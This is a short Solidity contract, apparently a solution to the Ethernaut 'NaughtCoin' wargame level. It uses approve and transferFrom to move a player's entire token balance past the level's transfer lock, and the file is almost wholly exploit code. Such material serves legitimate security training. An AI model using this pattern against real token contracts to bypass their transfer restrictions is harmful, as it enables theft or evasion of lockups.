/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinAttack {
    IERC20 public token;

    constructor(address _tokenAddress) payable {
        token = IERC20(_tokenAddress);
    }

    function transferTokens() public {
        // sender must be player and should have approved this contract to transfer all their balance
        uint playerBalance = token.balanceOf(msg.sender);
        require(token.transferFrom(msg.sender, address(this), playerBalance), "Transfer failed");
    }
}